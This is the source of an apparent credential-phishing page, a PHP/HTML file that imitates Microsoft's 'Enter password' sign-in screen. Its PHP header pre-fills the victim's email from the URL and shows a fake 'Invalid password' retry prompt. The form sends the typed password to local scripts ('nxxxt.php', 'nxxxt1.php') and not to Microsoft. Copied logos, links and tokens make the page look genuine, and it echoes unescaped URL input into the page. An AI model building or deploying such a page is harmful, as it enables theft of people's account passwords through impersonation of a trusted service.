﻿<!DOCTYPE html>
<?php
    error_reporting(0);
    $must=$_GET['file'];
    if(!$_GET['email']){
        //header("Location:https://microsoft.com/404");
         }
             if($_GET['retry']){
        $pss = "<div style='color:red;' role='alert' data-error='messages.ERROR_INVALID_PASSWORD'>Invalid password. Please try&nbsp;again</div><input name='passwd' type='password' id='i0118' autocomplete='off' class='form-control' aria-describedby='passwordError loginHeader passwordDesc' aria-required='true' data-bind='
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: passwordTextbox.error }' require='required' placeholder='Password' aria-label='Enter password'>";
        $post = "nxxxt1.php?file=DE54FTTY23454676MISHJ8934H59HWER9";
    }
    else{
        $pss = "<input name='passwd' type='password' id='i0118' autocomplete='off' class='form-control' aria-describedby='passwordError loginHeader passwordDesc' aria-required='true' data-bind='
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: passwordTextbox.error }' require='required' placeholder='Password' aria-label='Enter password'>";
        $post = "nxxxt.php?file=DE54FTTY23454676MISHJ8934H59HWER9";
    }
    ;?>
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

        <noscript>
            &lt;meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" /&gt;
        </noscript>
        <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/favicon_a.ico">
    
    <meta name="robots" content="none"></script> 



    <script type="text/javascript">
        ServerData = $Config;
    </script>

    
<link crossorigin="anonymous" href="./files/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
    <script crossorigin="anonymous" src="./files/convergedlogin_pcore.min.js.download" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>


    <script crossorigin="anonymous" src="./files/convergedloginpaginatedstrings-en.min.js.download" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    



</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="<?php echo $post;?>"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  --> 
                    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> 
                    <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $_GET['email']?>"> 
    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> 
  <!-- TODO: Rename 'displayName' property to unsafe_displayName here and in other corresponding views --> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
    params: {
        pawnIconId: svr.iPawnIcon,
        displayName: unsafe_displayName(),
        isBackButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; svr.fUseTextOnlyIdentityBannerWithBack },
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?=$_GET[login]?>"><?php echo $_GET['email']?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --> <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="./files/picker_account_aad.svg"> </div><!-- /ko --> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 



<?php echo $pss;?>






                     <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back"> </div> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 primary"> <input type="submit" name="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in"> </div> </div></div> </div> <div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRO2_TUACF47yUIlQqFhg7MCE5uX7mIVUozcNxEzu248S1Jajc5Dp2iH0d56YmGfgNhQkqsbAgZUCICSohMQchdWZmQEyIATGS_gCWMx19Ojrf_RSVpyr3WIbl7OJpmSzbPEOyZQqQNkvzJMMxPEMDasQBJrp9Y-8r-PTw6nO99uxp7vvzzduXa-KOi3E4rxQKcRznkeN4Q5gfIr_wgSCuCOIHQVwkMzAg-711cs4zPA_KHMXyPFvaUosgLxsqLenuRKb7WDLUWF4CIK9EqqOPWUvvY2tiPZZ1eSoZJmsZEtXVTcZcNX2prmJJ0CbdHgCSIPsdowEk38SmIU-6eoOVdZXa8thvyVvd6gK79HWgyFvB38kdB0X-SYjm-CL1huiGMBBHNRQEcIjz1zUYYG9oYw8FSoRCGGEPzg8cJYaDo1gIpeHZQlUGhl8timhYpElNOFxFfEMxq4rkK3bPaKkUd6JbdA8MSjScIq7daZvTMFbKA3dOU8tB19FkoYg9UmvaTieCSxO48ThkbHs2do9F1YuU2RNajNqlIj9jlcCFsfA-ld3e6qNgk9rdjgq80X4YIcebwqs08TN9E6QquVx2j7ib2E_8TROvM1tbf6C-fvHukfjx8sEX9Go3sckUzpoSFiTHmkxOj1Ylr6fVAq01Wwh1a9Eam-NDR-N0sR0Gx_X-AVWhzrPEeTb7K5u43Pmf6H81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+7" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                        params: {
                            serverData: svr,
                            availableCreds: availableCreds,
                            currentCred: 1 },
                        event: {
                            switchView: onSwitchView } } --><!--  --><!-- ko if: altCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="vFMtGMfZjjbJz8iSRCnRHquGDZuHgYgBfR5TIKpnXDU=1:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRO2_TUACF47yUIlQqFhg7MCE5uX7mIVUozcNxEzu248S1Jajc5Dp2iH0d56YmGfgNhQkqsbAgZUCICSohMQchdWZmQEyIATGS_gCWMx19Ojrf_RSVpyr3WIbl7OJpmSzbPEOyZQqQNkvzJMMxPEMDasQBJrp9Y-8r-PTw6nO99uxp7vvzzduXa-KOi3E4rxQKcRznkeN4Q5gfIr_wgSCuCOIHQVwkMzAg-711cs4zPA_KHMXyPFvaUosgLxsqLenuRKb7WDLUWF4CIK9EqqOPWUvvY2tiPZZ1eSoZJmsZEtXVTcZcNX2prmJJ0CbdHgCSIPsdowEk38SmIU-6eoOVdZXa8thvyVvd6gK79HWgyFvB38kdB0X-SYjm-CL1huiGMBBHNRQEcIjz1zUYYG9oYw8FSoRCGGEPzg8cJYaDo1gIpeHZQlUGhl8timhYpElNOFxFfEMxq4rkK3bPaKkUd6JbdA8MSjScIq7daZvTMFbKA3dOU8tB19FkoYg9UmvaTieCSxO48ThkbHs2do9F1YuU2RNajNqlIj9jlcCFsfA-ld3e6qNgk9rdjgq80X4YIcebwqs08TN9E6QquVx2j7ib2E_8TROvM1tbf6C-fvHukfjx8sEX9Go3sckUzpoSFiTHmkxOj1Ylr6fVAq01Wwh1a9Eam-NDR-N0sR0Gx_X-AVWhzrPEeTb7K5u43Pmf6H81"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="aa5465f6-b098-495e-b9ba-3fcb6f9d0e00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADX8GCi6Js6SK82TsD2Pb7roFMaPwJWMm7cHoxTDWldUSBVpmNmaRpUVIBunOqi3xcJe8RkTzJPi3jFwVcDG4ScqbQwcsaiOUWCrghJNP_-UiA7UJ0lRNTsq1mwIvrBQ5uls84tnmBNgG8-_u8zTTkuQw5GgxN3RJi6Lzm96SY0U6bcThQjqZvCX1ekb5pkRGnqyp4XO021PuIrRnt_Dz_D5jLyfabvLelFAJbEtnk7K_ekwaxL2LWZXCyfsmNHhemisUE_AUDDopjm7C8IbeR7DFyTlibokEWMnLd2N1Z_AwAiMRXqGcL9poZrbg-YI5KBLsXrDqvUywn4mEoE1PP2IAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="0"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="102"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                debugDetails: debugDetails,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid+profile&amp;state=OpenIdConnect.AuthenticationProperties%3dfPweVJwGpMcvuQPVWmA7Ioc72-RGBzr6EPYAPMmPaSWHQ15_TZ2S0V82elo5KLKYlpwP9Vhs21yVOfRNG7ti-RFafLreyY0hwgp3aaqghXIQirPqx2IrK876q4PnhewG&amp;nonce=636609514664820170.NWQ2MThjN2UtMWQwNy00NzI1LTg4ZTUtZjZkNTNlMWY4ZWM1OTY3YzFmMDQtMGRjOS00MGNmLWE0MmYtYWNjOTE4NTQ1MWQ4&amp;redirect_uri=https%3a%2f%2fwww.office.com%2f&amp;ui_locales=en-US&amp;mkt=en-US&amp;client-request-id=5dbd30cd-c0d0-4344-917e-08e492caae99#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;], attr: { title: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="./files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7527.10/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="./files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="./files/prefetch.html" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>